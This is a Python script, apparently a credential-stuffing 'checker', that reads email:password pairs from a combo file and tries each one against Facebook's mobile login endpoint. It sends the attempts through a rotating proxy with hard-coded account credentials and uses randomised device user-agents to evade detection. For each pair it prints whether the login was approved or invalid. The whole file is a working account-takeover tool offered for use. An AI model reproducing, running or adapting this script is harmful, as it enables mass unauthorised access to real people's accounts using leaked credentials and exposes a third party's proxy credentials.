import os 
try: 
    import requests 
    import json 
    import mechanize 
    import re 
    import random 
    import time 
except: 
    os.system("pip install requests mechanize") 
    import requests 
    import json 
    import mechanize 
    import re 
    import random 
    import time 
 
def getproxy(): 
    return { 
        "http": "http://vduheuap-rotate:bckhkp6hkizt@p.webshare.io:80", 
        "https": "http://vduheuap-rotate:bckhkp6hkizt@p.webshare.io:80" 
    } 
 
 
def generate_user_agent(): 
    android_version = random.choice(["10", "11", "12", "13"]) 
    fbav, fbbv = random.choice([ 
        ("391.2.0.20.404", "437533713"), 
        ("400.0.0.22.93", "448233450"), 
        ("410.1.0.25.83", "459123670") 
    ]) 
    fbapp = random.choice(["Orca-Android", "Facebook-Android"]) 
    lang = random.choice(["ar_EG", "en_US", "fr_FR", "de_DE"]) 
    network = random.choice(["Yemen Mobile", "Vodafone", "AT&T", "Orange", "T-Mobile"]) 
    arch = random.choice(["arm64-v8a", "armeabi-v7a"]) 
    density = random.choice(["2.75", "3.0", "3.5"]) 
    width, height = random.choice([(1080, 2220), (1440, 3040), (1280, 2400)]) 
    mf, bd, dv, build = random.choice([ 
        ("Xiaomi", "Redmi", "Redmi Note 8 Pro", "RP1A.200720.011"), 
        ("Samsung", "Samsung", "Galaxy S21", "SP1A.210812.016"), 
        ("Huawei", "Huawei", "Mate 40 Pro", "HMA-L29"), 
        ("OnePlus", "OnePlus", "OnePlus 9", "LE2113"), 
        ("Oppo", "Oppo", "Find X3 Pro", "PEEM00"), 
        ("Vivo", "Vivo", "X60 Pro", "V2046"), 
        ("Google", "Google", "Pixel 6", "SD1A.210817.037") 
    ]) 
 
    user_agent = ( 
        f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {dv} Build/{build}) " 
        f"[FBAN/{fbapp};FBAV/{fbav};FBPN/com.facebook.orca;FBLC/{lang};" 
        f"FBBV/{fbbv};FBCR/{network};FBMF/{mf};FBBD/{bd};FBDV/{dv};" 
        f"FBSV/{android_version};FBCA/{arch}:null;FBDM/{{density={density},width={width},height={height}}};" 
        f"FB_FW/1;]" 
    ) 
 
    return user_agent 
     
     
     
def Login(idf, pas): 
    proxy = getproxy() 
    try: 
        jas, Lsd, datr, sb, fr = Facebook()         
        payload = { 
    "__aaid": "0", 
    "__user": "0", 
    "__a": "1", 
    "__req": "1g", 
    "__hs": "20132.BP:wbloks_caa_pkg.2.0...0", 
    "dpr": "3", 
    "__ccg": "GOOD", 
    "__rev": "1020083033", 
    "__s": ":z4e545:6ti7od", 
    "__hsi": "7470902601209281195", 
    "__dyn": ( 
        "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde" 
    ), 
    "__csr": "", 
    "locale": "en_US", 
    "fb_dtsg": "NAcOj5GF9ttxTcMjHOoPS2rLhJ8bnUdHY4eo9e9KWurq-GnVxC7bPUA:0:0", 
    "jazoest": jas, 
    "lsd": Lsd, 
    "params": json.dumps( 
        { 
            "params": json.dumps( 
                { 
                    "server_params": { 
                        "credential_type": "password", 
                        "username_text_input_id": "emreph:68", 
                        "password_text_input_id": "emreph:69", 
                        "login_source": "Login", 
                        "login_credential_type": "none", 
                        "server_login_source": "login", 
                        "ar_event_source": "login_home_page", 
                        "should_trigger_override_login_success_action": 0, 
                        "should_trigger_override_login_2fa_action": 0, 
                        "is_caa_perf_enabled": 0, 
                        "reg_flow_source": "login_home_native_integration_point", 
                        "caller": "gslr", 
                        "is_from_landing_page": 0, 
                        "is_from_empty_password": 0, 
                        "is_from_password_entry_page": 0, 
                        "is_from_assistive_id": 0, 
                        "is_from_msplit_fallback": 0, 
                        "INTERNAL__latency_qpl_marker_id": 36707139, 
                        "INTERNAL__latency_qpl_instance_id": "88475678900410", 
                        "device_id": None,

"family_device_id": None, 
                        "waterfall_id": "18b3ea4a-36cf-4d33-92cf-95e341cd768f", 
                        "offline_experiment_group": None, 
                        "layered_homepage_experiment_group": None, 
                        "is_platform_login": 0, 
                        "is_from_logged_in_switcher": 0, 
                        "is_from_logged_out": 0, 
                        "access_flow_version": "F2_FLOW", 
                    }, 
                    "client_input_params": { 
                        "machine_id": "", 
                        "contact_point": idf, 
                        "password": f"#PWD_BROWSER:0:{str(int(time.time()))}:{pas}", 
                        "accounts_list": [], 
                        "fb_ig_device_id": [], 
                        "secure_family_device_id": "", 
                        "encrypted_msisdn": "", 
                        "headers_infra_flow_id": "", 
                        "try_num": 3, 
                        "login_attempt_count": 1, 
                        "event_flow": "login_manual", 
                        "event_step": "home_page", 
                        "openid_tokens": {}, 
                        "auth_secure_device_id": "", 
                        "client_known_key_hash": "", 
                        "has_whatsapp_installed": 0, 
                        "sso_token_map_json_string": "", 
                        "should_show_nested_nta_from_aymh": 0, 
                        "password_contains_non_ascii": "false", 
                        "has_granted_read_contacts_permissions": 0, 
                        "has_granted_read_phone_permissions": 0, 
                        "app_manager_id": "", 
                        "lois_settings": {"lois_token": ""}, 
                    }, 
                } 
            ) 
        } 
    ), 
} 
         
        headers = { 
            'User-Agent': f'Mozilla/5.0 (Linux; Android {random.choice(["9", "10", "11", "12", "13", "14"])}; {random.choice(["SM-G973F", "SM-G991B", "SM-G998B", "SM-A525F", "SM-A715F", "SM-A105F","Redmi Note 8 Pro", "Redmi Note 9S", "Redmi Note 10", "Redmi Note 11 Pro", "Redmi K40", "Mi 9T","Pixel 2", "Pixel 3", "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Pixel 8","OnePlus 7T", "OnePlus 8 Pro", "OnePlus 9", "OnePlus Nord 2", "OnePlus 10T","Vivo V23", "Vivo X60", "Vivo Y20", "Vivo Y51", "Vivo X80","Huawei P30", "Huawei P40 Pro", "Huawei Mate 30", "Huawei Nova 7", "Huawei Y9 Prime","Realme 5 Pro", "Realme 6", "Realme 7", "Realme GT Neo 2", "Realme X7","Oppo F11 Pro", "Oppo A9 2020", "Oppo Reno 4", "Oppo Reno 6 Pro", "Oppo Find X3 Pro"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice([f"132.0.{random.randint(4000, 7000)}.{random.randint(100, 300)}"])} Mobile Safari/537.36', 
            'sec-ch-ua-full-version-list': "\"Not A(Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"132.0.6834.163\", \"Google Chrome\";v=\"132.0.6834.163\"", 
            'sec-ch-ua-platform': "\"Android\"", 
            'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"", 
            'sec-ch-ua-model': "\"Redmi Note 8 Pro\"", 
            'sec-ch-ua-mobile': "?1", 
            'sec-ch-prefers-color-scheme': "light", 
            'sec-ch-ua-platform-version': "\"11.0.0\"", 
            'origin': "https://m.facebook.com", 
            'sec-fetch-site': "same-origin", 
            'sec-fetch-mode': "cors", 
            'sec-fetch-dest': "empty", 
            'accept-language': "en-US", 
            'priority': "u=1, i", 
            'Cookie': f"datr={datr}; sb={sb}; m_pixel_ratio=2.75; wd=393x752; fr={fr}" 
        } 
 
        url = "https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a" 
        response = requests.post(url, data=payload, proxies=proxy, headers=headers) 
 
        msg = response.text.encode("utf-8").decode("unicode-escape", errors="ignore") 
 
        if "Invalid username or password" in msg:

return "die" 
        elif "override_login_success_action" in msg: 
            return "live" 
        else: 
            return msg 
 
    except Exception as e: 
        return e 
         
def Facebook(): 
    try: 
        br = mechanize.Browser() 
        br.set_handle_robots(False) 
        br.set_handle_redirect(True) 
        br.set_handle_referer(True) 
        br.set_handle_equiv(True) 
        br.set_handle_refresh(False) 
        br.set_handle_gzip(True) 
        br.set_cookiejar(mechanize.CookieJar()) 
 
        br.addheaders = [ 
            ('User-Agent', generate_user_agent()), 
            ('Accept', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"), 
            ('Accept-Encoding', "gzip, deflate, br, zstd"), 
            ('upgrade-insecure-requests', "1"), 
            ('sec-fetch-site', "cross-site"), 
            ('sec-fetch-mode', "navigate"), 
            ('sec-fetch-dest', "document"), 
            ('dpr', "2.75"), 
            ('viewport-width', "980"), 
            ('sec-ch-ua', "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\""), 
            ('sec-ch-ua-mobile', "?1"), 
            ('sec-ch-ua-platform', "\"Android\""), 
            ('sec-ch-ua-platform-version', "\"11.0.0\""), 
            ('sec-ch-ua-model', "\"Redmi Note 8 Pro\""), 
            ('sec-ch-ua-full-version-list', "\"Not A(Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"132.0.6834.163\", \"Google Chrome\";v=\"132.0.6834.163\""), 
            ('sec-ch-prefers-color-scheme', "light"), 
            ('referer', "https://lm.facebook.com/"), 
            ('accept-language', "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"), 
            ('priority', "u=0, i") 
        ] 
 
        url = "https://m.facebook.com" 
        response = br.open(url) 
        html = response.read().decode("utf-8") 
        jas = re.search(r'"jazoest",\s*"(\d+)"', html) 
        Lsd = re.search(r'"lsd":"(.*?)"', html) 
        jas = jas.group(1) if jas else None 
        Lsd = Lsd.group(1) if Lsd else None        
        datr, sb, fr = None, None, None 
        for cookie in br.cookiejar: 
            if cookie.name == "datr": 
                datr = cookie.value 
            elif cookie.name == "sb": 
                sb = cookie.value 
            elif cookie.name == "fr": 
                fr = cookie.value 
 
        return jas, Lsd, datr, sb, fr 
 
    except Exception as e: 
        print(e) 
        return None, None, None, None, None 
 
combo = input('COMBO NAME: ') 
with open(combo, 'r') as arquivo: 
    start_num = 0 
    for linha in arquivo: 
        prx = getproxy() 
        start_num += 1 
        if ':' in linha: 
            email, senha = linha.strip().split(':', 1) 
            rps = Login(email, senha) 
            if "live" in rps: 
                print(f"{email}:{senha} -> Login Approved ✅") 
            elif "die" in rps: 
                print(f"{email}:{senha} -> Invalid Login ❌") 
            else: 
                print(f"{email}:{senha} -> ⚠️") 
        else: 
            print(f'Linha inválida: {linha.strip()}')